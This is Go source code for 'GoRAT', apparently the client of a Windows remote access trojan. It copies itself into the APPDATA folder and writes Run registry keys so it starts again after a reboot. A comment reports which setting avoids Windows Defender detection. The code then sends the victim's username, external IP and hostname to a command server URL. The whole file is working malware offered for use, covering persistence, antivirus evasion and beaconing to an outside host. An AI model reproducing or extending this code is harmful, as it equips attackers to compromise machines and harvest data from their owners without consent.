package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"

	externalip "github.com/glendc/go-external-ip"
	"golang.org/x/sys/windows/registry"
)

func checkPermissions() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	return true
}

func addRegKey(regLocation registry.Key, regPath string, key string, value string) bool {
	k, err := registry.OpenKey(regLocation, regPath, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		log.Fatal(err)
		return false
	}
	if err := k.SetStringValue(key, value); err != nil {
		log.Fatal(err)
		return false
	}
	if err := k.Close(); err != nil {
		log.Fatal(err)
		return true
	}
	return true
}

// Make application persistent using registry keys
func persistency(elevation bool) bool {
	// Create a copy of the application on %appdata% so we can easily access GoRAT's executable on the registry
	
	// Get application path
	goApp, err := os.Executable()
	if err != nil {
		panic(err)
	}

	// Open source file (this application)
	src, err := os.Open(goApp)
	if err != nil {
		log.Fatal(err)
		return false
	}
	defer src.Close()

	// Create or refer to the file
	fileToDestination := os.Getenv("APPDATA") + "\\gorat.exe" // Useful variable for later

	dest, err := os.Create(fileToDestination)
	if err != nil {
		log.Fatal(err)
		return false
	}
	defer dest.Close()

	// Actual copy
	_, err = io.Copy(dest, src)
	if err != nil {
		log.Fatal(err)
		return false
	}

	// Check if application has administrator permissions
	if checkPermissions() && elevation {
		// Main key
		adminLevelKey1st := "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
		addRegKey(registry.LOCAL_MACHINE, adminLevelKey1st, "GoRAT", fileToDestination)

		// Fallback key
		adminLevelKey2nd := "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run"
		addRegKey(registry.CURRENT_USER, adminLevelKey2nd, "GoRAT", fileToDestination)
	}
	userLevelKey := "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
	addRegKey(registry.CURRENT_USER, userLevelKey, "GoRAT", fileToDestination)
	return true
}

func main() {
	/*
	If the following variable is set to true, it will most likely flag on every anti-virus

	/!\ Tested with Windows Defender
	false: no flags
	true: Behavior:Win32/Persistence.MI!ml (Severe)
	*/
	var shouldUseAdminKeys bool = false
	persistency(shouldUseAdminKeys)

	// Set your server URI here
	hostserveruri := "https://example.com/api/server.php"

	// Get actual username
	name, err := os.UserHomeDir()
	if err != nil {
		name = ".\\.\\None"
	}

	// Get external IP
	splitN := strings.Split(name, "\\")
	consensus := externalip.DefaultConsensus(nil, nil)
	ip, err := consensus.ExternalIP()

	// Get Machine name (not user)
	machinename, err := os.Hostname()

	// Connection with the API
	client := &http.Client{}
	req, err := http.NewRequest("POST", hostserveruri, nil)

	req.Header.Add("x-ip", ip.String())
	req.Header.Add("x-name", splitN[2])
	req.Header.Add("x-mname", machinename)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(resp.StatusCode)
	}
}
